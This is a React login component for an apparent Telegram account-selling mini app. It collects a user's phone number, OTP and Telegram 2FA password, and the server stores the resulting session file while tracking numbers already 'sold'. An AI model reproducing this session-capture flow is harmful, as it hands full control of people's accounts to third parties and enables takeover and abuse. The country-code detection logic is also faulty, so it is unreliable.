"use client"

import type React from "react"

import { useState, useEffect } from "react"
import { parseApiError } from "@/lib/error-handler"

interface LoginPageProps {
  onLogin: () => void
  onBack: () => void
}

export default function LoginPage({ onLogin, onBack }: LoginPageProps) {
  const [phoneNumber, setPhoneNumber] = useState("")
  const [otp, setOtp] = useState("")
  const [step, setStep] = useState<"phone" | "otp" | "2fa">("phone")
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState("")
  const [phoneCodeHash, setPhoneCodeHash] = useState("")
  const [initialSessionString, setInitialSessionString] = useState("") // Session from sendOTP
  const [sessionString, setSessionString] = useState("") // Session after OTP verification
  const [password2FA, setPassword2FA] = useState("")

  const handleContinue = async () => {
    if (!phoneNumber.trim()) {
      setError("Please enter a phone number")
      return
    }

    // Validate phone number format
    if (!phoneNumber.startsWith('+')) {
      setError("Phone number must start with + and country code (e.g., +1234567890)")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Extract country code from phone number
      // Country codes can be 1-4 digits after the +
      let detectedCountryCode = ''
      const phoneDigits = phoneNumber.substring(1) // Remove +
      
      // Try to match country code (1-4 digits)
      for (let i = 1; i <= Math.min(4, phoneDigits.length); i++) {
        const code = phoneDigits.substring(0, i)
        detectedCountryCode = code
      }
      
      console.log('[LoginPage] Detected country code:', detectedCountryCode, 'from phone:', phoneNumber)
      
      // Get Telegram user ID for duplicate check
      const tg = (window as any).Telegram?.WebApp
      const telegramUser = tg?.initDataUnsafe?.user
      const telegramId = telegramUser?.id
      
      console.log('[LoginPage] Telegram user ID:', telegramId)
      
      // Check country capacity first
      const capacityResponse = await fetch('/api/countries/check-capacity', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: phoneNumber })
      })

      let capacityData
      try {
        capacityData = await capacityResponse.json()
      } catch (jsonError) {
        console.error('[LoginPage] Failed to parse capacity response:', jsonError)
        const errorMsg = 'Failed to check capacity. Please try again.'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      // Check if capacity check failed or not available
      if (!capacityData.success || !capacityData.available) {
        let errorMsg = ''
        
        if (capacityData.error) {
          // Country not found or other error
          errorMsg = capacityData.error
        } else if (!capacityData.available) {
          // Capacity full
          errorMsg = `❌ Capacity full for ${capacityData.countryName || 'this country'}. No more accounts can be sold.`
        } else {
          errorMsg = 'Failed to check capacity'
        }
        
        console.log('[LoginPage] Showing capacity error:', errorMsg)
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      // Send OTP via Telegram API
      const response = await fetch('/api/telegram/auth/send-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          phoneNumber: phoneNumber, 
          countryCode: detectedCountryCode,
          telegramId: telegramId // Pass Telegram ID for duplicate check
        })
      })

      // Check if response is ok
      if (!response.ok) {
        const text = await response.text()
        
        // Parse error to check if it's expected validation
        let errorData
        try {
          errorData = JSON.parse(text)
        } catch (e) {
          errorData = {}
        }
        
        // Expected errors (validation, not system errors)
        const expectedErrors = ['PHONE_ALREADY_SOLD', 'PHONE_ALREADY_ACCEPTED', 'PHONE_ALREADY_REJECTED', 'CAPACITY_FULL']
        if (expectedErrors.includes(errorData.error)) {
          console.log('[LoginPage] ℹ️  Validation:', errorData.message || errorData.error)
        } else {
          console.error('[LoginPage] ❌ Server error:', text)
        }
        
        const errorMsg = parseApiError(text, response.status)
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      // Parse JSON with error handling
      let data
      try {
        const text = await response.text()
        data = text ? JSON.parse(text) : {}
      } catch (jsonError) {
        console.error('[LoginPage] JSON parse error:', jsonError)
        const errorMsg = 'Invalid response from server. Please try again.'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      if (data.success) {
        setPhoneCodeHash(data.phoneCodeHash)
        setInitialSessionString(data.sessionString) // Store session for verification step
        setStep("otp")
        setError("")
      } else {
        const errorMsg = data.error || 'Failed to send OTP'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
      }
    } catch (err: any) {
      console.error('[LoginPage] Error:', err)
      const errorMsg = err.message || 'Network error'
      
      // Show Telegram toast notification
      const tg = (window as any).Telegram?.WebApp
      if (tg) {
        tg.showAlert(errorMsg)
      } else {
        setError(errorMsg)
      }
    } finally {
      setLoading(false)
    }
  }


  const handleVerifyOtp = async () => {
    if (otp.length !== 5) {
      setError("Please enter the complete OTP")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Get Telegram user ID
      const tg = (window as any).Telegram?.WebApp
      const telegramUser = tg?.initDataUnsafe?.user
      
      // Verify OTP and create session
      const response = await fetch('/api/telegram/auth/verify-otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber,
          phoneCodeHash,
          otpCode: otp,
          sessionString: initialSessionString, // Pass the session from sendOTP
          telegramId: telegramUser?.id // Pass telegram ID to create account record
        })
      })

      // Check if response is ok
      if (!response.ok) {
        const text = await response.text()
        console.error('[LoginPage] Server error:', text)
        const errorMsg = parseApiError(text, response.status)
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      // Parse JSON with error handling
      let data
      try {
        const text = await response.text()
        data = text ? JSON.parse(text) : {}
      } catch (jsonError) {
        console.error('[LoginPage] JSON parse error:', jsonError)
        const errorMsg = 'Invalid response from server. Please try again.'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      if (data.success) {
        // Session created successfully (no 2FA required)
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert('✅ Session created successfully!\nFile saved on server.\nUser added to pending list.')
        } else {
          alert('✅ Session created successfully!\nFile saved on server.\nUser added to pending list.')
        }
        onLogin()
      } else if (data.requires2FA) {
        // 2FA required
        setSessionString(data.sessionString || '') // Save session for 2FA step
        setStep("2fa")
        setError("")
      } else {
        const errorMsg = data.error || 'Failed to verify OTP'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
      }
    } catch (err: any) {
      console.error('[LoginPage] Error:', err)
      const errorMsg = err.message || 'Network error'
      
      // Show Telegram toast notification
      const tg = (window as any).Telegram?.WebApp
      if (tg) {
        tg.showAlert(errorMsg)
      } else {
        setError(errorMsg)
      }
    } finally {
      setLoading(false)
    }
  }

  const handleVerify2FA = async () => {
    if (!password2FA.trim()) {
      setError("Please enter your 2FA password")
      return
    }

    setLoading(true)
    setError("")

    try {
      // Get Telegram user ID
      const tg = (window as any).Telegram?.WebApp
      const telegramUser = tg?.initDataUnsafe?.user
      
      const response = await fetch('/api/telegram/auth/verify-2fa', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phoneNumber,
          sessionString,
          password: password2FA,
          telegramId: telegramUser?.id // Pass telegram ID to create account record
        })
      })

      // Check if response is ok
      if (!response.ok) {
        const text = await response.text()
        console.error('[LoginPage] Server error:', text)
        const errorMsg = parseApiError(text, response.status)
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      // Parse JSON with error handling
      let data
      try {
        const text = await response.text()
        data = text ? JSON.parse(text) : {}
      } catch (jsonError) {
        console.error('[LoginPage] JSON parse error:', jsonError)
        const errorMsg = 'Invalid response from server. Please try again.'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
        
        setLoading(false)
        return
      }

      if (data.success) {
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert('✅ Session created successfully with 2FA!\nFile saved on server.\nUser added to pending list.')
        } else {
          alert('✅ Session created successfully with 2FA!\nFile saved on server.\nUser added to pending list.')
        }
        onLogin()
      } else {
        const errorMsg = data.error || 'Invalid password'
        
        // Show Telegram toast notification
        const tg = (window as any).Telegram?.WebApp
        if (tg) {
          tg.showAlert(errorMsg)
        } else {
          setError(errorMsg)
        }
      }
    } catch (err: any) {
      console.error('[LoginPage] Error:', err)
      const errorMsg = err.message || 'Network error'
      
      // Show Telegram toast notification
      const tg = (window as any).Telegram?.WebApp
      if (tg) {
        tg.showAlert(errorMsg)
      } else {
        setError(errorMsg)
      }
    } finally {
      setLoading(false)
    }
  }

  const handleOtpChange = (value: string) => {
    // Only allow digits and limit to 5 characters
    const digits = value.replace(/\D/g, '').slice(0, 5)
    setOtp(digits)
  }

  return (
    <div className="bg-white flex flex-col" style={{ height: '100vh', overflow: 'hidden' }}>
      {/* Login Form */}
      <div className="flex-1 flex flex-col items-center justify-center px-6 py-8">
        {step === "phone" ? (
          <>
            <h2 className="text-[28px] font-bold text-gray-900 mb-2">Login Account</h2>
            <p className="text-gray-400 text-center mb-16 text-[14px]">Please enter your account phone number</p>

            {/* Phone Input */}
            <div className="w-full max-w-md mb-auto">
              <input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="+1234567890"
                className="w-full px-4 py-3.5 border-2 border-blue-500 rounded-[18px] text-[14px] text-gray-700 placeholder-gray-400 focus:outline-none focus:border-blue-600 transition-colors"
              />
            </div>

            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

            {/* Continue Button */}
            <div className="fixed bottom-0 left-0 right-0 px-6 pb-8">
              <button
                onClick={handleContinue}
                disabled={loading}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3.5 rounded-full font-medium text-[15px] hover:from-blue-600 hover:to-blue-700 disabled:opacity-50 shadow-md transition-all"
              >
                {loading ? "Sending OTP..." : "Continue"}
              </button>
            </div>
          </>
        ) : step === "otp" ? (
          <>
            <h2 className="text-[28px] font-bold text-gray-900 mb-2">Verify OTP</h2>
            <p className="text-gray-400 text-center mb-1 text-[14px]">Enter the OTP sent to</p>
            <p className="text-gray-700 text-center mb-16 font-semibold text-[14px]">{phoneNumber}</p>

            {/* OTP Input */}
            <div className="w-full max-w-md mb-auto">
              <input
                type="text"
                inputMode="numeric"
                maxLength={5}
                placeholder="Enter OTP"
                className="w-full px-4 py-3.5 border-2 border-blue-500 rounded-[18px] text-center text-[18px] font-semibold text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-600 transition-colors"
                value={otp}
                onChange={(e) => handleOtpChange(e.target.value)}
                autoFocus
              />
              <p className="text-xs text-gray-500 text-center mt-3">Check your Telegram app for the code</p>
            </div>

            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

            {/* Verify Button */}
            <div className="fixed bottom-0 left-0 right-0 px-6 pb-8">
              <button
                onClick={handleVerifyOtp}
                disabled={loading || otp.length !== 5}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3.5 rounded-full font-medium text-[15px] hover:from-blue-600 hover:to-blue-700 disabled:opacity-50 shadow-md transition-all mb-3"
              >
                {loading ? "Verifying..." : "Verify OTP"}
              </button>

              {/* Change Phone Number */}
              <button
                onClick={() => {
                  setStep("phone")
                  setOtp("")
                  setError("")
                }}
                className="w-full text-blue-500 text-[14px] hover:text-blue-600 font-normal"
              >
                Change phone number
              </button>
            </div>
          </>
        ) : (
          <>
            {/* 2FA Password Step */}
            <h2 className="text-[28px] font-bold text-gray-900 mb-2">Two-Factor Authentication</h2>
            <p className="text-gray-400 text-center mb-16 text-[14px]">Enter your Telegram password</p>

            {/* Password Input */}
            <div className="w-full max-w-md mb-auto">
              <input
                type="password"
                value={password2FA}
                onChange={(e) => setPassword2FA(e.target.value)}
                placeholder="Password"
                className="w-full px-4 py-3.5 border-2 border-blue-500 rounded-[18px] text-[14px] text-gray-700 placeholder-gray-400 focus:outline-none focus:border-blue-600 transition-colors"
              />
            </div>

            {error && <p className="text-red-500 text-sm mb-4">{error}</p>}

            {/* Verify Button */}
            <div className="fixed bottom-0 left-0 right-0 px-6 pb-8">
              <button
                onClick={handleVerify2FA}
                disabled={loading}
                className="w-full bg-gradient-to-r from-blue-500 to-blue-600 text-white py-3.5 rounded-full font-medium text-[15px] hover:from-blue-600 hover:to-blue-700 disabled:opacity-50 shadow-md transition-all"
              >
                {loading ? "Verifying..." : "Continue"}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  )
}
